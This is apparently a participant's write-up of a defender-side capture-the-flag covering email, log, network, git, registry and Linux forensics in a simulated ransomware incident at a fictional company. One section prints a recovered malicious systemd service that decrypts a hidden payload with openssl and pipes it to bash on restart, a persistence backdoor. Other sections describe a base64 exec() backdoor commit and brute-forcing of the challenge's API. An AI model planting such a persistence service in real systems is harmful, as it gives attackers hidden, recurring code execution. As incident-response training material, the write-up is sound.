# 🛡️ 2025 Target WiCyS Challenge (Tier 1) – Writeup

**CTF Name:** 2025 Target WiCyS Challenge  
**Date:** July, 1 - August, 14  
**Total Challenges:** 12  
**Completed:** 12/12  
**Points:** 3000/3000   
**Place:** 7th   
**Participants:** 1000+  

> **Point System:**
🟢 100 points – Easy
🟡 300 points – Medium
🔴 500 points – Hard

This challenge simulates a cyberattack against a tech company, where participants play both defender (Tier 1) and threat actor (Tier 2) roles. The challenge focuses on incident response, threat detection, and threat intelligence.

---

## 📚 Table of Contents

[D1. Mystery Mail (Easy 🟢, Email Forensics)](#d1-mystery-mail)  
[D2. Not-so-Simple Mail Protocol (Easy 🟢, Log Analysis)](#d2-not-so-simple-mail-protocol)  
[D3. Ransom Wrangler (Easy 🟢, Social Engineering/Incident Response)](#d3-ransom-wrangler)  
[D4. Trout of Office (Hard 🔴, Log Analysis/Forensics)](#d4-trout-of-office)  
[D5. Ahoy, PCAP'n! (Medium 🟡, Network Forensics)](#d5-ahoy-pcapn)  
[D6. Smuggled away! (Hard 🔴, Network Forensics)](#d6-smuggled-away)  
[D7. Endpoints and Exfiltration (Easy 🟢, Endpoint Forensics)](#d7-endpoints-and-exfiltration)  
[D8. Shadow Commit (Easy 🟢, Git Forensics)](#d8-shadow-commit)  
[D9. Logging for Truth (Medium 🟡, Log Analysis)](#d9-logging-for-truth)  
[D10. Backup Break-in (Easy 🟢, Forensics)](#d10-backup-break-in)  
[D11. Semi-Final Boss (Medium 🟡, Windows Registry Forensics)](#d11-semi-final-boss)  
[D12. Final Boss (Hard 🔴, Linux Forensics)](#d12-final-boss)   

---

## D1. Mystery Mail

**Category:** Email Forensics  
**Points:** 100 (Easy)  
**Solves:** 804  
**Description:**  
> _As a member of the Personalyz.io cybersecurity team, you receive a ransom email threatening to leak stolen data unless demands are met within 48 hours. Your task is to perform initial forensic analysis and extract the sender's original IP address from the email file to assist in incident response._

**Tools Used:**  
- Text Editor

**Solution:**  

After opening the attached file in the text editor, we are able to see the sender’s IP address.  
<img width="857" height="271" alt="Sender IP" src="https://github.com/user-attachments/assets/b385b087-0561-4cce-9aff-71797bdfab56" />

The first "Received: from" line (when reading from the bottom up) usually indicates the origin of the message or the server from which the sender's mail client connected. The "From:" address is sgreen123@gwagm.co. This strongly suggests that gwagm.co is the sending domain, and associated IP address is the server or client that initiated the send to gwagm.co's mail system.

---

## D2. Not-so-Simple Mail Protocol

**Category:** Log Analysis  
**Points:** 100 (Easy)  
**Solves:** 682  
**Description:**  
> _After receiving a ransom email threatening to leak stolen data, your task is to trace earlier attempts by the threat actor to send the same message. Using the Insightful Horizon (OpenSearch Dashboard), identify the first extortion email sent and submit the sender's email address as the flag._

**Tools Used:**  
- OpenSearch Dashboards

**Solution:**  

First, I searched the sender’s IP address, but there is only a letter from the previous task in the results. In that email we can trace the email path and other IP addresses indicating a server that handled the email.
<img width="857" height="271" alt="Sender IP2" src="https://github.com/user-attachments/assets/51ed5741-a955-41fe-9db0-055de00d232f" />  

Search for the second IP reveals the previous email.
<img width="2038" height="818" alt="First email" src="https://github.com/user-attachments/assets/78d70af4-f19b-4838-bec0-368618c64228" />  
 
---

## D3. Ransom Wrangler

**Category:** Social Engineering / Incident Response  
**Points:** 100 (Easy)  
**Solves:** 640  
**Description:**  
> _Here the task is to simulate communication with a ransomware actor to validate claims of a data breach, obtain proof (victim's email), and negotiate terms including ransom reduction (30 BTC) and deadline extension (96-hour). You will need to collect three flags to complete the challenge: email from stolen data, ransom reduction code and deadline extension code. Flag submiting format: email@example.com:CTF-RAN-XXXXXXXX:CTF-DEA-XXXXXXXX_

**Tools Used:**  
- Custom email interface
- Social Engineering & Negotiation skills

**Solution:**  
The key principles I followed were:
- Show cooperation, not confrontation.
- Acknowledge concessions.
- Present internal policies as non-negotiable, rather than personal choices.
- Emphasize that agreement enables a fast, clean outcome.

The goal is to make the attacker feel like reducing demands is in their best interest, not a loss, but a smart move toward a guaranteed payout.

**Step 1**  
We started by requesting a verifiable sample of the allegedly stolen data.  

Email Sent:
>We have received your message. We understand the gravity of your claims.
>
>Before we can engage in any substantive discussions regarding your demands, it is an absolute necessity for our security and legal teams to independently verify your claims of data exfiltration.
>
>To facilitate this, we require a small, specific sample of the allegedly stolen data. Specifically, we request a single customer email address from the dataset you claim to possess.
>
>Please provide this specific email address. Once verified, we can discuss next steps.
>
>Sincerely,  
>Lead Incident Responder  
>Personalyz.io Security Team

Result:  
The attacker responded with full customer data, including an email address.  
This confirmed the breach. Flag 1 collected.

**Step 2**  
Next, we pushed to extend the deadline from 48 to 96 hours, citing internal approval constraints and legal review requirements.  

Email sent:
>We've verified the data sample. This allows us to move forward.
>
>However, your proposed terms present significant practical challenges for us as a regulated entity.
>
>45 BTC requires extensive internal approvals and compliance checks, which we cannot complete within 48 hours.
>
>We require:
>- Deadline Extension: 96 hours from this email.
>- Revised Demand: We're prepared to discuss a figure below 30 BTC.
>
>Sincerely,  
>Lead Incident Responder  
>Personalyz.io Security Team  

Attacker’s Response:  
They first counter-offered 72 hours, but we pushed again:

Follow-Up:  
>While 72 hours is an improvement, achieving the full 96 hours would significantly streamline our ability to proceed efficiently.
>
>Is there any possibility of stretching to the full 96 hours?
>
>We also need to finalize a figure below 30 BTC.
>
>Sincerely,  
>Lead Incident Responder  
>Personalyz.io Security Team

Result:  
Attacker agreed to the 96-hour extension. Flag 3 collected.

**Step 3**   
Finally, we returned to price negotiation, stating we could not process anything over 30 BTC.

Email Sent:
>Thank you for agreeing to the 96-hour deadline.
>
>Regarding the financial demand, while 35 BTC is a move in the right direction, it's still higher than we can realistically process.
>
>We need to settle on a figure below 30 BTC to proceed.
>
>Sincerely,  
>Lead Incident Responder  
>Personalyz.io Security Team

The attacker countered with 32 BTC. We escalated again:  

Final Push:  
>We appreciate your further movement on the price. The 32 BTC offer, combined with the 96-hour deadline, shows a willingness to find common ground.
>
>However, our internal approval process has a very firm threshold. We absolutely need to finalize this transaction below 30 BTC.
>
>Reaching an agreement just under 30 BTC guarantees immediate action and a swift conclusion for both parties.
>
>Sincerely,  
>Lead Incident Responder  
>Personalyz.io Security Team

Result:  
The attacker accepted a ransom under 30 BTC. Flag 2 collected.  

---

## D4. Trout of Office

**Category:** Log analysis/ Forensics  
**Points:** 500 (Hard)  
**Solves:** 36  
**Description:**  
> _Personalyz.io has received a ransom email claiming that over 50GB of sensitive data has been exfiltrated. With the lead database admin Zeek off the grid, it’s up to you to investigate.
>Your goal is to determine whether the leaked victim data matches any records in the company’s systems by analyzing logs and metadata.
>You’ve obtained partial victim data from the threat actor during Challenge D3: Ransom Wrangler. Now you’ll need to uncover additional details._
> 
>_The flag format is as follows: system-name_birthdate_middle-initial_last-4-digits-of-SSN_person-record-id_
> 
>_You have access to a dashboard log viewer and can choose from three servers. You also know that the security team uses this entrypoint to access the application system: https://target-flask.chals.io/_

**Tools Used:**  
- OpenSearch Dashboards
- curl
- Python scripts

**Solution:**  
This challenge was less about a single "aha" moment and more about persistence. It took significantly longer than other tasks, and there were many points where it felt like a dead end.

**Step 1**  
While reviewing the http-logs in Insightful Horizon, I came across an API request that stood out from the rest: `/okta/auth/client/8b8bcd59-66c2-4920-b14f-5fc495a6d7fc/cel?use=25baeee8-8d0d-4704-a666-02620392bc9b&addr=421f454c-40be-4ae4-9271-e825c70265a9&pmt=342644019686141`.  
Most other requests returned a generic 404, but this one was different. Running a curl command on it produced:
```
HTTP/1.0 404 NOT FOUND
Date: Tue, 12 Aug 2025 22:23:59 GMT
Server: WSGIServer/0.2 CPython/3.12.11
Content-Type: text/html; charset=utf-8
Content-Length: 9
X-Rick: https://www.youtube.com/watch?v=eYuUAGXN0KM
Access-Control-Allow-Origin: *

try again
```
The fact that it responded differently, included an `X-Rick` header, and contained three UUID-like values (`use`, `addr`, and `pmt`) suggested this was part of the intended path. My assumption:
- `use` → likely a user ID
- `addr` → address ID
- `pmt` → payment/credit card reference

**Step 2**  
Tracing back to the original log entry containing this API call, I noticed it lacked a `User-Agent` value. Filtering all logs where `User-Agent` was empty revealed four more API requests with a similar structure and similarly unusual `curl` responses.  

<img width="1809" height="704" alt="D4_2" src="https://github.com/user-attachments/assets/224348a5-7a51-482a-82f6-770c0ff36391" />  

**Step 3**  
At this point, five API calls emerged that presumably required inserting correct values in place of GUIDs to obtain meaningful data.

This step was the most challenging. The Zeek logs looked like nonsense at first but contained values like names, surnames, addresses, credit card numbers, and fragments resembling GUID pieces. Initially, I thought I needed to assemble "correct" GUIDs from these fragments. However, the logic behind the logs was unclear and possibly non-existent.

We were given logs from three servers. Comparing the data across these servers showed differences, leading me to hypothesize that only the data present identically on all three servers mattered.

After exporting logs from all three servers, filtering for the victim I had previously identified (Leland Rowland) and keeping only the data consistent across all servers, I obtained a list of fragments categorized as follows:
- Names
- Surnames
- Street 
- City 
- Zip codes
- State

**Step 4**  
Among the API calls, one contained two GUIDs. After testing various combinations by substituting the extracted fragments, categorized as Names and Surnames, for the GUIDs, one combination succeeded: `https://target-flask.chals.io/apps_per-SAPSOFT/p/5cfea3/d6c97d`, which returned HTTP 200 OK and a new data fragment: `d0f5af22fb`.  

**Step 5**  
We also had address-related values (postal code, state, city, street) from the logs. Another API call contained four GUIDs in its URL, representing these address components: `/l/a/f2d0ef88-4684-43d6-931a-a3d8ebd67215/?_a=73404b08-df40-4df9-8ee6-bb7a53728ea4&cc=9ea52b2f-b604-4f53-9b80-aa873e455009&g=29b759da-2559-42f2-9e1c-e971a50658ef`.  

Next I used a Python script to automate testing all permutations of city and state fragments against this API endpoint:  
[`address_tester.py`](https://github.com/AGruneva/ctf-writeups/blob/main/2025%20-%20Target%20WiCyS%20CTF/address_tester.py)  

The script identified a valid combination returning HTTP 200 OK: `https://target-flask.chals.io/l/a/59a95/?_a=19ebb9&cc=5c599a&g=387835`, and one more data fragment: `7be54a88fa`.

**Step 6**  
We next focus on the API call: `/okta/auth/client/5c17019e-6b24-4f4a-8c5d-13847f72681d/cel?use=cad823e7-98d4-4682-96db-3f30cf26d900&addr=c25056ce-6ac8-4961-8cd4-85d66ac5d327&pmt=342644019686141`.  
By substituting known GUIDs and values we collected earlier, along with the victim’s credit card number (already known), we form the request: `https://target-flask.chals.io/okta/auth/client/d0f5af22fb/cel?use=8842&addr=7be54a88fa&pmt=375524824238842`.  
Here:
- `d0f5af22fb` – user ID found earlier
- `8842` – last 4 credit card numbers
- `7be54a88fa` – address ID found earlier
- `375524824238842` – victim’s credit card number

During log analysis, the header `X-active: 11/30` appeared in the HTTP logs. I hypothesized that this value represented the credit card expiration date, so I included it in the request.

We then send a request with specific headers using curl:
```
curl -H "X-active: 11/28" -H "X-Pon-Leopard: 8842" \
"https://target-flask.chals.io/okta/auth/client/d0f5af22fb/cel?use=8842&addr=7be54a88fa&pmt=375524824238842"
```
The server responds with a date of birth, and clearly part of the final flag.

**Step 7**  
Next target: `/vendor/salesforce/tuvok/bbc7f740-3d44-439a-8181-fbf9c0976f16/d83dc86b-9a7c-475c-8379-1fc656fc4dd7?v=d03a70ea-0ed5-4bdf-b299-6bdaf3f4a38e&b=1972-06-29`.  

We know the date (b= parameter) must be replaced with the date of birth we just found, and that the three GUIDs need to be substituted with correct identifiers from our earlier collected dataset.

To avoid manual trial and error, I vibe coded a Python script to brute-force all permutations of the three unknown GUID positions:  
[`guid_bruteforser.py`](https://github.com/AGruneva/ctf-writeups/blob/main/2025%20-%20Target%20WiCyS%20CTF/guid_bruteforcer.py)  

The script found the correct combination:
```
https://target-flask.chals.io/vendor/salesforce/tuvok/d6c97d/5cfea3?v=7be54a88fa&b=1969-07-22
Response Body: 417-61-{last_4_digits_of_SSN}
```
This is a Social Security Number, another key piece of the flag.

**Step 8**  
The last API call was: `/cloudfront/cache/2025/2005/10/30`.  

Initially, it was unclear what format or values it required. I even tryied another brute-force script to try numeric combinations from all numbers we had, but without success. 

Eventually, by pure chance during another manual test, I replaced the path parameters with the SSN and date of birth from the previous steps:
```
curl -i "https://target-flask.chals.io/cloudfront/cache/417-61-{last_4_digits_of_SSN}/{year_of_birth}/{month_of_birth}/{day_of_birth}"
```
The response was:
```
HTTP/1.0 200 OK
Date: Wed, 13 Aug 2025 15:30:49 GMT
Server: WSGIServer/0.2 CPython/3.12.11
Retry-After: 60
X-Zeke-Status: gone fishin'
X-COMPUTER-SYSTEM: {system_name}
X-Client-ID: {person_record_ID}
Content-Type: text/html; charset=utf-8
Content-Length: 16
Access-Control-Allow-Origin: *

Leland {middle_initial} ROWLAND
```
This revealed the remaining three pieces of the flag, mission complete! 

---

## D5. Ahoy, PCAP'n!

**Category:** Network Forensics  
**Points:** 300 (Medium)  
**Solves:** 406  
**Description:**  
> _The company’s network team has captured a short PCAP file around the time of a suspected breach. Your mission: find the compromised host exfiltrating sensitive data and the Command-and-Control (C2) server it’s communicating with. The flag format is as follows: compromised-hostname_C2-IP_

**Tools Used:**  
- Wireshark

**Solution:**  

**Step 1**  
Searching by the available IPs and emails didn’t yield any results. Next, I filtered HTTP requests but also didn’t find anything suspicious.

Then I switched to analyzing DNS traffic and noticed suspicious domains, such as: 
>p5hjqx.bytefcdn-ttpeu.com

These domain names looked random and meaningless, an indicator of DNS tunneling. DNS tunneling is a technique where attackers encode data into DNS queries and responses to bypass firewalls and exfiltrate information without raising alarms. Because DNS is almost always allowed through network boundaries, it can be abused as a covert channel for Command-and-Control (C2) communication or data theft. For reference, see the MITRE ATT&CK technique: Exfiltration Over Alternative Protocol (T1048.003).

After identifying the suspicious DNS packets, I filtered them by destination IP to focus only on the possible C2 channel. The traffic patterns confirmed the tunneling suspicion.  

<img width="1283" height="500" alt="dns tunnel" src="https://github.com/user-attachments/assets/538fc776-edd6-4aa7-bbba-87aa4641509a" />


**Step 2**  
Next step was to determine the compromised hostname. I enabled name resolution in Wireshark by going to:
>View → Name Resolution → Resolve Network Addresses

This revealed the compromised host’s name.  

<img width="1280" height="454" alt="hostname" src="https://github.com/user-attachments/assets/5bfddb3e-730f-400d-a44e-a4625f30dd52" />  

---

## D6. Smuggled away!

**Category:** Network Forensics  
**Points:** 500 (Hard)  
**Solves:** 294  
**Description:**  
> _We’ve tracked the data exfiltration. Now it’s time to see exactly what was stolen. Dig through the provided PCAP to extract:_
>- _Credit card expiration date_
>- _CVV code_
>- _Email of the compromised client_
>  
>_Flag format: Expiration_CVV_Email_

**Tools Used:**  
- Wireshark
- Tshark
- CyberChef

**Solution:**  

**Step 1**  
So, this is a continuation of the previous task. We take the same pcap file and extract domains using the command:
```
bash
"C:\Program Files\Wireshark\tshark.exe" -r "C:\{Path_to}\pirates.pcap" -Y "dns.qry.name and ip.dst == {C2_IP}" -T fields -e dns.qry.name > domains.txt  
```
Explanation:  
1️⃣ Take the pcap file → pirates.pcap  
2️⃣ Run through TShark → "C:\Program Files\Wireshark\tshark.exe"  
3️⃣ Filter → only dns.qry.name and ip.dst == {C2_IP}  
4️⃣ Output only the needed field → dns.qry.name (domain)  
5️⃣ Save → to domains.txt  

This command extracts all domain names from DNS queries sent to C2_IP in the pirates.pcap file and saves them into domains.txt.

**Step 2**  
When examining the first part of the domains (before the first dot), it was observed that they only contain lowercase letters a–z and digits 2–7. This matches the standard Base32 alphabet defined in RFC 4648, just in lowercase form. Then, I used the following command:
```
powershell
(Get-Content domains.txt) -replace '\..*','' -join '' | ForEach-Object { $_.ToUpper() } > clean.txt  
```
This command reads all domains from domains.txt, removes everything after the first dot, concatenates the remaining parts into one continuous string, converts it to uppercase, and writes the result to clean.txt.

**Step 3**  
Then I used CyberChef to decode the data, and it revealed the flag.
<img width="1251" height="382" alt="base32" src="https://github.com/user-attachments/assets/2759d23e-0e9d-4c1d-a5fa-2b1c4e430dd3" />
  
---

## D7. Endpoints and Exfiltration

**Category:** Endpoint Forensics  
**Points:** 100 (Easy)  
**Solves:** 300  
**Description:**  
> _Following the investigation in D5, you’ve identified the backup server as the source of the data exfiltration and the destination IP used by the threat actor. Now, your mission is to find out which software on that server is responsible for sending the data out.You’ve been provided with endpoint data: outputs from commands like lsof, ps, and history. Your job is to analyze these files to pinpoint the malicious process, the user running it, and the executable involved.
> Flag format: USER_FILE_PID_

**Tools Used:**  
- Text Editor

**Solution:**  

**Step 1**  
In the `lsof` file (this command lists open files and network connections for processes), if you search for the known IP from task D5, you find the following line:  
<img width="1462" height="178" alt="endpoint" src="https://github.com/user-attachments/assets/5b3636c8-447d-4fef-8ad9-ff592e474ab1" />  


This line means that this process has an established UDP connection from local IP 10.75.34.13 port 33421 to remote IP on the DNS port.  
From this, we learn the PID and the username.  

**Step 2**  
Next, searching for this PID in the `ps` file (this command shows the list of current running processes and their details), we find the line:  
<img width="1420" height="162" alt="endpoint2" src="https://github.com/user-attachments/assets/e007b837-9842-4822-8ad4-a331039cfbb7" />   

This line tells us that this process using /usr/bin/jot as the executable.  

**Step 3**  
Finally, searching for /usr/bin/jot in the `history` file (this command shows the history of commands executed by the user), we find the line:  
<img width="486" height="202" alt="endpoint3" src="https://github.com/user-attachments/assets/a5799c3d-e0ed-441a-8090-eb0fa21f5c6c" />    

This command creates a symbolic link pointing to the original executable /usr/bin/jot. This may be an attempt to disguise the malicious executable under a different name.  

---

## D8. Shadow Commit

**Category:** Git Forensics  
**Points:** 100 (Easy)  
**Solves:** 252  
**Description:**  
> _Personalyz.io’s internal app was compromised via a malicious git commit. You have only the .git directory with commit history.
Find the commit hash introducing the malicious change and extract the malicious IPv4 address.
Flag format: ###.###.###.###_

**Tools Used:**  
- Git Extensions
- Git Bash
- CyberChef

**Solution:**  

**Step 1**  
I suspected the malicious code might use Base64 encoding to hide its payload.  
From the repository directory, I ran:
```
bash
git log -S "base64"
```
This searches the Git history for any commits containing the string `base64`.  
The suspicious commit was found:  
<img width="570" height="113" alt="suspicious commit" src="https://github.com/user-attachments/assets/acc36b4b-f52f-4a71-9ca4-acc92016cdb8" />  

**Step 2**  
Using Git Extensions, I examined commit `b188b42c34f772d2d9ccc006692d65cd597fc57d` and saw the following changes in `backupy/fileman.py`:
<img width="2054" height="1176" alt="commit" src="https://github.com/user-attachments/assets/ee061d79-3273-4055-9adb-256241285416" />  
The attacker added an import for `b64decode` (aliased as `ute`) and inserted an `exec()` statement that decodes and runs a Base64-encoded string, an obfuscation technique.

**Step 3**  
I copied the Base64 string into CyberChef and decoded it:
<img width="1427" height="733" alt="decoded string" src="https://github.com/user-attachments/assets/aa4f40bd-1b27-4af2-b15c-f9f1a18f0e23" />  
It contained multiple nested calls. These were second-layer Base64 payloads, so I repeated the decoding process until the actual code appeared.

**Step 4**  
The final decoded code imported several modules. It also defined the function:
<img width="1442" height="313" alt="decoded line" src="https://github.com/user-attachments/assets/8bccf00e-1e3b-48d5-b7d9-432473364c09" />  

The function sends the query to IP address, which is a flag.

---

## D9. Logging for Truth

**Category:** Log Analisys  
**Points:** 300 (Medium)  
**Solves:** 163  
**Description:**  
> _In this challenge, you must determine who really inserted malicious Base64-encoded backdoor code into a GitHub repository. Although all commits appear to be made by developer Erik, the goal is to investigate imported GitHub audit logs in the Insightful Horizon dashboard to see if he was framed. By analyzing the `audit-logs` index across multiple repositories he worked on in the last six months, you must identify the true culprit and submit their IP address as the flag._

**Tools Used:**  
- OpenSearch Dashboard

**Solution:**  
From the previous challenge, we know that the malicious commit was attributed to Eric (username `elesiuta`). I filtered the logs by this username, looked at the `actorIP` field, and scrolled through until I found a single different IP. That IP was the flag.  
<img width="1704" height="358" alt="commit ip" src="https://github.com/user-attachments/assets/ec880157-3231-4ff8-9b4d-b2ec96dc9f29" />  
  
---

## D10. Backup Break-in

**Category:** Forensics  
**Points:** 100 (Easy)  
**Solves:** 144  
**Description:**  
> _Connect to the backup server and download the full archive of company files. Extract the `.tar.gz` data and search through the contents to locate the stored credentials of the malicious Git committer.  The password (starting with `wicys`) is the flag._

**Tools Used:**  
- VS Code
- CyberChef

**Solution:**  

**Step 1**  
Inspecting the source code of the given login page revealed an encoded password string.  
<img width="606" height="126" alt="credentials" src="https://github.com/user-attachments/assets/ba86f1d0-5cf0-4ce7-ac41-e1a23294ff3e" />  

Using CyberChef, I decoded the string (Base64) to obtain valid login credentials.  
<img width="859" height="277" alt="decoded password" src="https://github.com/user-attachments/assets/b3f96cbe-0be6-4aae-aead-550d9bef2e53" />  

This allowed me to successfully authenticate and access the backup server dashboard.  

**Step 2**  
On the dashboard, I identified and downloaded the most recent successful backup.  
The archive contained multiple directories and files, requiring further inspection.  

**Step 3**  
While browsing through the extracted folders, I located a Slack archive. Inside, a `.json` file stored conversation data.
Opening the file in VS Code and searching for the keyword `"password"` revealed an encoded credential string.
<img width="2367" height="453" alt="massage password" src="https://github.com/user-attachments/assets/ce31d273-ad3a-4291-b80a-fa2d1920febb" />  

**Step 4**  
Using CyberChef again, I decoded the string to retrieve the plaintext password.  
This password started with `"wicys"`, matching the challenge’s flag format.  
<img width="1006" height="335" alt="flag password" src="https://github.com/user-attachments/assets/9c45f426-c1c6-4b9a-a686-f5d7e16d89b1" />  

---

## D11. Semi-Final Boss

**Category:** Windows Registry Forensics  
**Points:** 300 (Medium)  
**Solves:** 93  
**Description:**  
> _You are given a Windows registry hive extracted from a new employee’s workstation. The system appears clean (no malware, suspicious network activity, or credential compromise is detected), but something unusual may still be hidden in the registry. Your task is to analyze the hive using forensic tools, identify at least one suspicious registry key that could indicate persistence, policy changes, or other malicious activity, and submit the key’s full path as the flag._

**Tools Used:**  
- RegistryExplorer

**Solution:**  

**Step 1**  
I used Registry Explorer to open the `hklm.system.hiv` file in a safe, isolated environment.

**Step 2**  
Before diving in, I considered common sources of forensic evidence within the Windows registry. My focus was on persistence mechanisms, system policies, and device connection history, places where anomalies often hide even when malware is absent.  
Knowing that USB device history is a common forensic artifact, I navigated to `HKLM\SYSTEM\ControlSet001\Enum\USBSTOR`.  
This location stores records of all USB mass storage devices connected to the system.

**Step 3**  
Inside `USBSTOR`, I found an entry for a Lexar USB Flash Drive.  
This included a serial number-like identifier, confirming it was a real, physical device connected to the workstation.
Within its Properties folder, a GUID was present.  
This GUID is known to store device connection timestamps and other metadata. Subfolders such as `0003`, `000A`, `0064`, `0065`, `0066` contained various details like device description, first install date, and last connection time.
<img width="762" height="692" alt="regystry hive" src="https://github.com/user-attachments/assets/821ad485-5b82-4f64-82ae-e894d0827ba9" />  


Why this is suspicious:  
- The system was otherwise "clean", yet records show a USB flash drive was connected.
- USB drives are a known method for offline data exfiltration, bypassing network monitoring tools. This aligns with MITRE ATT&CK subtechnique T1052.001 – Exfiltration Over Physical Medium: Exfiltration over USB, where adversaries use USB device to transfer data.
- The presence of installation and connection timestamps allows investigators to correlate the device usage with other events in the case timeline.  

The full path for this registry key is a flag.

---

## D12. Final Boss

**Category:** Linux Forensics  
**Points:** 500 (Hard)  
**Solves:** 72  
**Description:**  
> _This challenge involves forensic analysis of an SD card image taken from a TinyPilot device suspected of being used for remote control in an insider threat case. The SD card contains a Raspberry Pi boot partition and Linux file system. The goal is to mount and examine the image in a safe environment, locate an IOC (such as a domain, IP address, or email) that reveals the attacker’s possible location or links them to a known threat group, and submit it as the flag._

**Tools Used:**  
- VirtualBox & Linux VM
- VS Code

**Solution:**  

**Step 1**  
The provided SD card image was encrypted and required a password to mount. After trying several possible passwords based on challenge hints, the correct one was `tinypilot`, which successfully decrypted the disk.  

**Step 2**  
Once mounted, I began exploring the file system for possible IOCs. I focused on directories likely to store configuration files or persistence mechanisms.
The folder `/etc/systemd/system` drew my attention because it often contains custom service files that can be used for persistence or to run attacker-controlled scripts. For reference, see the MITRE ATT&CK subtechnique: Create or Modify System Process: Systemd Service (T1543.002).

Inside, I found a suspicious file named `tunnel.service`, last modified on February 19, 2025, a date consistent with earlier incident events.

**Step 3**  
The service file contained the following:  
```
[Unit]
After=network.target

[Service]
Type=simple
User=user
Environment=SERVICEDATA="U2FsdGVkX1/YfJQW/JLTLYE//2c7AodbgJVFXknjQ+kyUkNRZDCTXWADnwFCjHKVJAOG2rk+iUvCETeXv3+I8PWGSVOUesrzqMFp+OBVd/4="
ExecStart=/bin/bash -c 'openssl enc -aes-256-cbc -d -a -pass pass:$HOSTNAME$MACHTYPE -pbkdf2 <<< "$SERVICEDATA" | bash'
After=network.target
Restart=always
RestartSec=60
StartLimitInterval=0

[Install]
WantedBy=multi-user.target
```
This revealed that the attacker had stored encrypted data in the `SERVICEDATA` variable and used an openssl command to decrypt it, with the decryption key being a concatenation of the system’s HOSTNAME and MACHTYPE values.

**Step 4**  
To retrieve the decryption key:
- I located the hostname in `/etc/hostname` → `tinypilot`.
- Finding the MACHTYPE was trickier. I performed a global search for the term "MACHTYPE" in VS Code and found it in the `bashbug` file under `/bin` → `arm-unknown-linux-gnueabihf`.

**Step 5**  
With both values in hand, the decryption password was `tinypilotarm-unknown-linux-gnueabihf`.
Running the `openssl` command from the service file with this password produced a plaintext output containing an IP address (the IOC and final flag for this challenge).

<img width="816" height="162" alt="Screenshot 2025-08-06 111655" src="https://github.com/user-attachments/assets/a824f26e-46c8-47cf-9911-db62566ddf26" />  

---

**Key takeaways:**
- Strengthened log, network, and endpoint forensics skills through hands-on challenges.
- Learned to combine automation and manual analysis for complex investigations.
- Practiced incident response and negotiation techniques in simulated ransomware scenarios.
- Gained experience with modern attack methods like DNS tunneling, exfiltration, and obfuscated code.
- Reinforced the importance of documentation, persistence, and analytical thinking in cybersecurity.
